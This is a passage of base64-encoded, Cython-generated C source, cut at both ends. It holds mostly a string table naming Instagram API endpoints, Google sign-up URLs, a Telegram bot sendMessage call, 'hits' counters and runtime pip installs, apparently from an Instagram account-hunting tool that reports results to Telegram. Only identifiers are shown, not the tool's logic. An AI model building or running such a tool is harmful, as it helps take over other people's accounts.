NyZiksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfZ3JlZW4sIHNpemVvZihfX3B5eF9rX2dyZWVuKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19ncm91cCwgc2l6ZW9mKF9fcHl4X2tfZ3JvdXApLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2d1aWQsIHNpemVvZihfX3B5eF9rX2d1aWQpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2d6aXBfZGVmbGF0ZSwgc2l6ZW9mKF9fcHl4X2tfZ3ppcF9kZWZsYXRlKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19oYXNobGliLCBzaXplb2YoX19weXhfa19oYXNobGliKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19oZSwgc2l6ZW9mKF9fcHl4X2tfaGUpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2hlMywgc2l6ZW9mKF9fcHl4X2tfaGUzKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19oZWFkZXJzLCBzaXplb2YoX19weXhfa19oZWFkZXJzKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19oZXhkaWdlc3QsIHNpemVvZihfX3B5eF9rX2hleGRpZ2VzdCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfaGhoaCwgc2l6ZW9mKF9fcHl4X2tfaGhoaCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfaGl0cywgc2l6ZW9mKF9fcHl4X2tfaGl0cyksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfaG9zdCwgc2l6ZW9mKF9fcHl4X2tfaG9zdCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfaHR0cHNfYWNjb3VudHNfZ29vZ2xlX2NvbSwgc2l6ZW9mKF9fcHl4X2tfaHR0cHNfYWNjb3VudHNfZ29vZ2xlX2NvbSksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfaHR0cHNfYWNjb3VudHNfZ29vZ2xlX2NvbV9fX3NpZ24sIHNpemVvZihfX3B5eF9rX2h0dHBzX2FjY291bnRzX2dvb2dsZV9jb21fX19zaWduKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19odHRwc19hY2NvdW50c19nb29nbGVfY29tX19fc2lnbl8yLCBzaXplb2YoX19weXhfa19odHRwc19hY2NvdW50c19nb29nbGVfY29tX19fc2lnbl8yKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19odHRwc19hY2NvdW50c19nb29nbGVfY29tX3NpZ25pbiwgc2l6ZW9mKF9fcHl4X2tfaHR0cHNfYWNjb3VudHNfZ29vZ2xlX2NvbV9zaWduaW4pLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX2h0dHBzX2FjY291bnRzX2dvb2dsZV9jb21fc2lnbnVwLCBzaXplb2YoX19weXhfa19odHRwc19hY2NvdW50c19nb29nbGVfY29tX3NpZ251cCksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfaHR0cHNfYWNjb3VudHNfZ29vZ2xlX2NvbV9zaWdudXBfMiwgc2l6ZW9mKF9fcHl4X2tfaHR0cHNfYWNjb3VudHNfZ29vZ2xlX2NvbV9zaWdudXBfMiksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfaHR0cHNfYXBpX3RlbGVncmFtX29yZ19ib3QsIHNpemVvZihfX3B5eF9rX2h0dHBzX2FwaV90ZWxlZ3JhbV9vcmdfYm90KSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19odHRwc19pX2luc3RhZ3JhbV9jb21fYXBpX3YxX2FjYywgc2l6ZW9mKF9fcHl4X2tfaHR0cHNfaV9pbnN0YWdyYW1fY29tX2FwaV92MV9hY2MpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX2h0dHBzX3d3d19pbnN0YWdyYW1fY29tLCBzaXplb2YoX19weXhfa19odHRwc193d3dfaW5zdGFncmFtX2NvbSksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfaHR0cHNfd3d3X2luc3RhZ3JhbV9jb21fMiwgc2l6ZW9mKF9fcHl4X2tfaHR0cHNfd3d3X2luc3RhZ3JhbV9jb21fMiksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfaHR0cHNfd3d3X2luc3RhZ3JhbV9jb21fYXBpX2dyYXAsIHNpemVvZihfX3B5eF9rX2h0dHBzX3d3d19pbnN0YWdyYW1fY29tX2FwaV9ncmFwKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19odHRwc193d3dfaW5zdGFncmFtX2NvbV9jcmlzdGlhbiwgc2l6ZW9mKF9fcHl4X2tfaHR0cHNfd3d3X2luc3RhZ3JhbV9jb21fY3Jpc3RpYW4pLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX2ksIHNpemVvZihfX3B5eF9rX2kpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2lfaW5zdGFncmFtX2NvbSwgc2l6ZW9mKF9fcHl4X2tfaV9pbnN0YWdyYW1fY29tKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19pZHMsIHNpemVvZihfX3B5eF9rX2lkcyksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfaWdfc2lnX2tleV92ZXJzaW9uLCBzaXplb2YoX19weXhfa19pZ19zaWdfa2V5X3ZlcnNpb24pLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2ltX3JhbWRvb3QsIHNpemVvZihfX3B5eF9rX2ltX3JhbWRvb3QpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX2ltcG9ydGxpYiwgc2l6ZW9mKF9fcHl4X2tfaW1wb3J0bGliKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19pbXBvcnRsaWJfdXRpbCwgc2l6ZW9mKF9fcHl4X2tfaW1wb3J0bGliX3V0aWwpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2luZm9pbnN0YSwgc2l6ZW9mKF9fcHl4X2tfaW5mb2luc3RhKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19pbml0aWFsaXppbmcsIHNpemVvZihfX3B5eF9rX2luaXRpYWxpemluZyksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfaW5wdXQsIHNpemVvZihfX3B5eF9rX2lucHV0KSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19pc1ByYWlzZSwgc2l6ZW9mKF9fcHl4X2tfaXNQcmFpc2UpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2lzX2J1c2luZXNzLCBzaXplb2YoX19weXhfa19pc19idXNpbmVzcyksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfaXNfY29yb3V0aW5lLCBzaXplb2YoX19weXhfa19pc19jb3JvdXRpbmUpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2lzX3ByaXZhdGUsIHNpemVvZihfX3B5eF9rX2lzX3ByaXZhdGUpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2lzX3ZlcmlmaWVkLCBzaXplb2YoX19weXhfa19pc192ZXJpZmllZCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfaXNlbmFibGVkLCBzaXplb2YoX19weXhfa19pc2VuYWJsZWQpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX2pvaW4sIHNpemVvZihfX3B5eF9rX2pvaW4pLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2pxLCBzaXplb2YoX19weXhfa19qcSksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfanNvbiwgc2l6ZW9mKF9fcHl4X2tfanNvbiksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfaywgc2l6ZW9mKF9fcHl4X2tfayksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfa2VlcF9hbGl2ZSwgc2l6ZW9mKF9fcHl4X2tfa2VlcF9hbGl2ZSksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfbHNkLCBzaXplb2YoX19weXhfa19sc2QpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX20sIHNpemVvZihfX3B5eF9rX20pLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX21fanFfcHksIHNpemVvZihfX3B5eF9rX21fanFfcHkpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX21haW4sIHNpemVvZihfX3B5eF9rX21haW4pLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX21kNSwgc2l6ZW9mKF9fcHl4X2tfbWQ1KSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19tZWRpYV9jb3VudCwgc2l6ZW9mKF9fcHl4X2tfbWVkaWFfY291bnQpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX21ldGEsIHNpemVvZihfX3B5eF9rX21ldGEpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX21pZF9aVmZHdmdBQkFBR29RcWE3QVkzbWdvWUJWMW5QLCBzaXplb2YoX19weXhfa19taWRfWlZmR3ZnQUJBQUdvUXFhN0FZM21nb1lCVjFuUCksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfbW9kdWxlLCBzaXplb2YoX19weXhfa19tb2R1bGUpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX24xLCBzaXplb2YoX19weXhfa19uMSksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfbjIsIHNpemVvZihfX3B5eF9rX24yKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19uYW1lLCBzaXplb2YoX19weXhfa19uYW1lKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19uYW1lXzIsIHNpemVvZihfX3B5eF9rX25hbWVfMiksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfbmV4dCwgc2l6ZW9mKF9fcHl4X2tfbmV4dCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfbnQsIHNpemVvZihfX3B5eF9rX250KSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19udWxsLCBzaXplb2YoX19weXhfa19udWxsKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19udWxsX251bGxfbnVsbF9udWxsX251bGxfTkxfbnVsLCBzaXplb2YoX19weXhfa19udWxsX251bGxfbnVsbF9udWxsX251bGxfTkxfbnVsKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19vLCBzaXplb2YoX19weXhfa19vKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19vaywgc2l6ZW9mKF9fcHl4X2tfb2spLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX29wZW4sIHNpemVvZihfX3B5eF9rX29wZW4pLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX29yaWdpbiwgc2l6ZW9mKF9fcHl4X2tfb3JpZ2luKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19vcywgc2l6ZW9mKF9fcHl4X2tfb3MpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX291dHB1dCwgc2l6ZW9mKF9fcHl4X2tfb3V0cHV0KSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19wYXJhbXMsIHNpemVvZihfX3B5eF9rX3BhcmFtcyksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfcGlwX2luc3RhbGxfYnM0LCBzaXplb2YoX19weXhfa19waXBfaW5zdGFsbF9iczQpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX3BpcF9pbnN0YWxsX2NvbG9yYW1hLCBzaXplb2YoX19weXhfa19waXBfaW5zdGFsbF9jb2xvcmFtYSksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfcGlwX2luc3RhbGxfaGFzaGxpYiwgc2l6ZW9mKF9fcHl4X2tfcGlwX2luc3RhbGxfaGFzaGxpYiksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfcGlwX2luc3RhbGxfanNvbiwgc2l6ZW9mKF9fcHl4X2tfcGlwX2luc3RhbGxfanNvbiksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfcGlwX2luc3RhbGxfcHl0aG9uX2Nmb250cywgc2l6ZW9mKF9fcHl4X2tfcGlwX2luc3RhbGxfcHl0aG9uX2Nmb250cyksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfcGlwX2luc3RhbGxfcmFuZG9tLCBzaXplb2YoX19weXhfa19waXBfaW5zdGFsbF9yYW5kb20pLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX3BpcF9pbnN0YWxsX3JlLCBzaXplb2YoX19weXhfa19waXBfaW5zdGFsbF9yZSksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfcGlwX2luc3RhbGxfcmVxdWVzdHMsIHNpemVvZihfX3B5eF9rX3BpcF9pbnN0YWxsX3JlcXVlc3RzKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19waXBfaW5zdGFsbF9yaWNoLCBzaXplb2YoX19weXhfa19waXBfaW5zdGFsbF9yaWNoKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19waXBfaW5zdGFsbF90aHJlYWRpbmcsIHNpemVvZihfX3B5eF9rX3BpcF9pbnN0YWxsX3RocmVhZGluZyksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfcGlwX2luc3RhbGxfdGltZSwgc2l6ZW9mKF9fcHl4X2tfcGlwX2luc3RhbGxfdGltZSksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfcGlwX2luc3RhbGxfdXNlcl9hZ2VudCwgc2l6ZW9mKF9fcHl4X2tfcGlwX2luc3RhbGxfdXNlcl9hZ2VudCksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfcGlwX2luc3RhbGxfdXVpZCwgc2l6ZW9mKF9fcHl4X2tfcGlwX2luc3RhbGxfdXVpZCksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfcGssIHNpemVvZihfX3B5eF9rX3BrKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19wb3AsIHNpemVvZihfX3B5eF9rX3BvcCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfcG9zdCwgc2l6ZW9mKF9fcHl4X2tfcG9zdCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfcHAsIHNpemVvZihfX3B5eF9rX3BwKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19wcHBwLCBzaXplb2YoX19weXhfa19wcHBwKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19wcmludCwgc2l6ZW9mKF9fcHl4X2tfcHJpbnQpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3ByaW50aW5nLCBzaXplb2YoX19weXhfa19wcmludGluZyksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfcHJpb3JpdHksIHNpemVvZihfX3B5eF9rX3ByaW9yaXR5KSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19xY29tX2VuX1VTXzU0NTk4Niwgc2l6ZW9mKF9fcHl4X2tfcWNvbV9lbl9VU181NDU5ODYpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX3F1YWxuYW1lLCBzaXplb2YoX19weXhfa19xdWFsbmFtZSksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfcXVlcnksIHNpemVvZihfX3B5eF9rX3F1ZXJ5KSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19yLCBzaXplb2YoX19weXhfa19yKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19yYW5kX2lkcywgc2l6ZW9mKF9fcHl4X2tfcmFuZF9pZHMpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3JhbmRpbnQsIHNpemVvZihfX3B5eF9rX3JhbmRpbnQpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3JhbmRvbSwgc2l6ZW9mKF9fcHl4X2tfcmFuZG9tKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19yYW5kcmFuZ2UsIHNpemVvZihfX3B5eF9rX3JhbmRyYW5nZSksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfcmFuZ2UsIHNpemVvZihfX3B5eF9rX3JhbmdlKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19yZSwgc2l6ZW9mKF9fcHl4X2tfcmUpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3JlYWQsIHNpemVvZihfX3B5eF9rX3JlYWQpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3JlZmVyZXIsIHNpemVvZihfX3B5eF9rX3JlZmVyZXIpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3JlbmRlciwgc2l6ZW9mKF9fcHl4X2tfcmVuZGVyKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19yZXF1ZXN0cywgc2l6ZW9mKF9fcHl4X2tfcmVxdWVzdHMpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3JlczEsIHNpemVvZihfX3B5eF9rX3JlczEpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3Jlc3BvbnNlLCBzaXplb2YoX19weXhfa19yZXNwb25zZSksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfcmVzdCwgc2l6ZW9mKF9fcHl4X2tfcmVzdCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfcmljaF9jb25zb2xlLCBzaXplb2YoX19weXhfa19yaWNoX2NvbnNvbGUpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3JpY2hfcGFuZWwsIHNpemVvZihfX3B5eF9rX3JpY2hfcGFuZWwpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3JuZCwgc2l6ZW9mKF9fcHl4X2tfcm5kKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19yciwgc2l6ZW9mKF9fcHl4X2tfcnIpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3NlYXJjaCwgc2l6ZW9mKF9fcHl4X2tfc2VhcmNoKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19zZW5kLCBzaXplb2YoX19weXhfa19zZW5kKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19zZW5kTWVzc2FnZV9jaGF0X2lkLCBzaXplb2YoX19weXhfa19zZW5kTWVzc2FnZV9jaGF0X2lkKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19zZXJ2ZXJfdGltZXN0YW1wcywgc2l6ZW9mKF9fcHl4X2tfc2VydmVyX3RpbWVzdGFtcHMpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3NldF9uYW1lLCBzaXplb2YoX19weXhfa19zZXRfbmFtZSksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfc2lnbmVkX2JvZHksIHNpemVvZihfX3B5eF9rX3NpZ25lZF9ib2R5KSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19zcGVjLCBzaXplb2YoX19weXhfa19zcGVjKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19zcGxpdCwgc2l6ZW9mKF9fcHl4X2tfc3BsaXQpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3NwbGl0bGluZXMsIHNpemVvZihfX3B5eF9rX3NwbGl0bGluZXMpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3NzLCBzaXplb2YoX19weXhfa19zcyksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfc3RhcnQsIHNpemVvZihfX3B5eF9rX3N0YXJ0KSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19zdGRvdXQsIHNpemVvZihfX3B5eF9rX3N0ZG91dCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfc3VicHJvY2Vzcywgc2l6ZW9mKF9fcHl4X2tfc3VicHJvY2VzcyksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfc3lzLCBzaXplb2YoX19weXhfa19zeXMpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3N5c3RlbSwgc2l6ZW9mKF9fcHl4X2tfc3lzdGVtKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa190LCBzaXplb2YoX19weXhfa190KSwgMCwgMSwgMX0sIFxuICB7X19weXhfa190YXJnZXQsIHNpemVvZihfX3B5eF9rX3RhcmdldCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfdGVzdCwgc2l6ZW9mKF9fcHl4X2tfdGVzdCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfdGV4dCwgc2l6ZW9mKF9fcHl4X2tfdGV4dCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfdGV4dF8yLCBzaXplb2YoX19weXhfa190ZXh0XzIpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX3RocmVhZGluZywgc2l6ZW9mKF9fcHl4X2tfdGhyZWFkaW5nKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa190aHJlYWRzLCBzaXplb2YoX19weXhfa190aHJlYWRzKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa190aHJvdywgc2l6ZW9mKF9fcHl4X2tfdGhyb3cpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3RpbWUsIHNpemVvZihfX3B5eF9rX3RpbWUpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3RsLCBzaXplb2YoX19weXhfa190bCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfdGxfdHh0LCBzaXplb2YoX19weXhfa190bF90eHQpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX3RsbCwgc2l6ZW9mKF9fcHl4X2tfdGxsKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa190bGxfbG9jYWxzX2dlbmV4cHIsIHNpemVvZihfX3B5eF9rX3RsbF9sb2NhbHNfZ2VuZXhwciksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfdG9rLCBzaXplb2YoX19weXhfa190b2spLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3RvdGFsLCBzaXplb2YoX19weXhfa190b3RhbCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfdHJ1ZSwgc2l6ZW9mKF9fcHl4X2tfdHJ1ZSksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfdV8xX2ksIHNpemVvZihfX3B5eF9rX3VfMV9pKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa191YSwgc2l6ZW9mKF9fcHl4X2tfdWEpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3VpZCwgc2l6ZW9mKF9fcHl4X2tfdWlkKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa191c2VyLCBzaXplb2YoX19weXhfa191c2VyKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa191c2VySUQsIHNpemVvZihfX3B5eF9rX3VzZXJJRCksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfdXNlcl9hZ2VudCwgc2l6ZW9mKF9fcHl4X2tfdXNlcl9hZ2VudCksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfdXNlcl9hZ2VudF8yLCBzaXplb2YoX19weXhfa191c2VyX2FnZW50XzIpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3VzZXJuYW1lLCBzaXplb2YoX19weXhfa191c2VybmFtZSksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfdXNlcm5hbWVfY3Jpc3RpYW5vLCBzaXplb2YoX19weXhfa191c2VybmFtZV9jcmlzdGlhbm8pLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX3V0Zl84LCBzaXplb2YoX19weXhfa191dGZfOCksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfdXRpbCwgc2l6ZW9mKF9fcHl4X2tfdXRpbCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfdXVpLCBzaXplb2YoX19weXhfa191dWkpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3V1aWQsIHNpemVvZihfX3B5eF9rX3V1aWQpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3V1aWQ0LCBzaXplb2YoX19weXhfa191dWlkNCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfdXV1LCBzaXplb2YoX19weXhfa191dXUpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3V1dV9sb2NhbHNfZ2VuZXhwciwgc2l6ZW9mKF9fcHl4X2tfdXV1X2xvY2Fsc19nZW5leHByKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa192YWx1ZSwgc2l6ZW9mKF9fcHl4X2tfdmFsdWUpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3ZhcmlhYmxlcywgc2l6ZW9mKF9fcHl4X2tfdmFyaWFibGVzKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa193LCBzaXplb2YoX19weXhfa193KSwgMCwgMSwgMX0sIFxuICB7X19weXhfa193ZWJicm93c2VyLCBzaXplb2YoX19weXhfa193ZWJicm93c2VyKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa193cml0ZSwgc2l6ZW9mKF9fcHl4X2tfd3JpdGUpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3gsIHNpemVvZihfX3B5eF9rX3gpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3hfZmJfZnJpZW5kbHlfbmFtZSwgc2l6ZW9mKF9fcHl4X2tfeF9mYl9mcmllbmRseV9uYW1lKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa194X2ZiX2xzZCwgc2l6ZW9mKF9fcHl4X2tfeF9mYl9sc2QpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX3llbGxvdywgc2l6ZW9mKF9fcHl4X2tfeWVsbG93KSwgMCwgMSwgMX0sIFxuICB7X19weXhfa195eSwgc2l6ZW9mKF9fcHl4X2tfeXkpLCAwLCAxLCAxfSwgXG4gIHswLCAwLCAwLCAwLCAwfVxufTtcblxuc3RhdGljIGludCBfX1B5eF9Jbml0U3RyaW5ncyhfX1B5eF9TdHJpbmdUYWJFbnRyeSBjb25zdCAqdCwgUHlPYmplY3QgKip0YXJnZXQsIGNvbnN0IGNoYXIqIGNvbnN0KiBlbmNvZGluZ19uYW1lcyk7XG5cblxuXG5zdGF0aWMgaW50IF9fUHl4X0luaXRDYWNoZWRCdWlsdGlucyhfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpIHtcbiAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfbXN0YXRlKTtcbiAgX19weXhfYnVpbHRpbl9wcmludCA9IF9fUHl4X0dldEJ1aWx0aW5OYW1lKF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3ByaW50KTsgaWYgKCFfX3B5eF9idWlsdGluX3ByaW50KSBfX1BZWF9FUlIoMCwgNzQsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9idWlsdGluX2lucHV0ID0gX19QeXhfR2V0QnVpbHRpbk5hbWUoX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfaW5wdXQpOyBpZiAoIV9fcHl4X2J1aWx0aW5faW5wdXQpIF9fUFlYX0VSUigwLCA5NywgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X2J1aWx0aW5fb3BlbiA9IF9fUHl4X0dldEJ1aWx0aW5OYW1lKF9fcHl4X21zdGF0ZS0+X19weXhfbl91X29wZW4pOyBpZiAoIV9fcHl4X2J1aWx0aW5fb3BlbikgX19QWVhfRVJSKDAsIDE3MiwgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X2J1aWx0aW5fcmFuZ2UgPSBfX1B5eF9HZXRCdWlsdGluTmFtZShfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9yYW5nZSk7IGlmICghX19weXhfYnVpbHRpbl9yYW5nZSkgX19QWVhfRVJSKDAsIDEzMSwgX19weXhfTDFfZXJyb3IpXG4gIHJldHVybiAwO1xuICBfX3B5eF9MMV9lcnJvcjo7XG4gIHJldHVybiAtMTtcbn1cblxuXG5zdGF0aWMgaW50IF9fUHl4X0luaXRDYWNoZWRDb25zdGFudHMoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKSB7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X21zdGF0ZSk7XG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJfX1B5eF9Jbml0Q2FjaGVkQ29uc3RhbnRzIiwgMCk7XG5cbiAgXG4gIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzBdID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjA4KTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVswXSkpIF9fUFlYX0VSUigwLCAxMTMsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMF0pO1xuICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzBdKTtcblxuICBcbiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMV0gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF85KTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxXSkpIF9fUFlYX0VSUigwLCAxMzEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X